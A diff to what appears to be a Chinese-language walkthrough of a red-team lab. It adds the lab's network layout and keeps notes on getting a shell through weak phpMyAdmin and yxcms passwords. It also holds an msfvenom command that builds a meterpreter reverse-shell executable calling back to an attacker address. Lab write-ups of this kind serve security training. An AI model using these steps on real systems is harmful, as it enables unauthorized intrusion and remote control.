@@ -522,7 +522,11 @@ wmic /node:“hostname” bios get serialnumber (this can be great for finding w
 
 ```
 1.网络结构
-  
+    靶机1 双网卡（内网：192.168.52.143，外网：192.168.101.80） 
+    靶机2 内192.168.52.141
+    靶机3 内192.168.52.138
+    靶机2，3不出网且138域控，本地网段为192.168.101.0/24
+
 2.题目2个入口phpmyadmin弱口令通过修改日志getshell；yxcms弱口令后台getshell。
 3.使用msf生成后门上传至服务器并执行：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.101.66 LPORT=1234 -f exe > shell.exe
   设置监听：
